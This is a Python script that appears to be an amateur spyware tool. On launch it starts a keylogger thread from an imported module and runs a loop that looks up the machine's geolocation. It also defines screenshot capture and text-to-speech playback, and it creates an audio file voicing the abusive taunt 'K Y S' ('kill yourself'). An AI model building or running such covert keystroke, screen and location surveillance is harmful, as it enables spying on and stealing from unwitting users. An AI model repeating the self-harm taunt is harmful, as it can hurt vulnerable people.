import _thread, time, Keylogger, pygame, requests, json
import os
from PIL import ImageGrab

from gtts import gTTS

#--------PRINT SCREEN--------
def printScreen():
    ImageGrab.grab().save("screenshot.jpg", "JPEG")

#--------RETURN JSON FILE WITH LOCATION DETAILS--------
def getLocation():
    send_url = 'http://freegeoip.net/json'
    r = requests.get(send_url)
    j = json.loads(r.text)
    return j

def timeTest(mod):
    ctr = 0
    while True:
        print (ctr)
        ctr+=mod
        time.sleep(1)

def tt():
    ctr = 0
    while True:
        print(ctr)
        ctr += 5
        time.sleep(1)

def play():
    pygame.mixer.init()
    pygame.mixer.music.load("Speech.mp3")
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        continue


#--------TEXT TO SPEECH--------
def speak(x):
    text = gTTS(text= x, lang= 'en')
    with open("Speech.mp3", 'wb') as f:
        text.write_to_fp(f)
        f.close()
    play()
    delete()

def delete():
    time.sleep(2)
    pygame.mixer.music.load("Holder.mp3")
    os.remove("Speech.mp3")

def mainFunc():
    while True:
        choice = input()
        getLocation()

tts = gTTS(text='K Y S', lang='en')
tts.save("Holder.mp3")
_thread.start_new_thread(Keylogger.launchLogger, ())
_thread.start_new_thread(mainFunc, ())

while 1:
   pass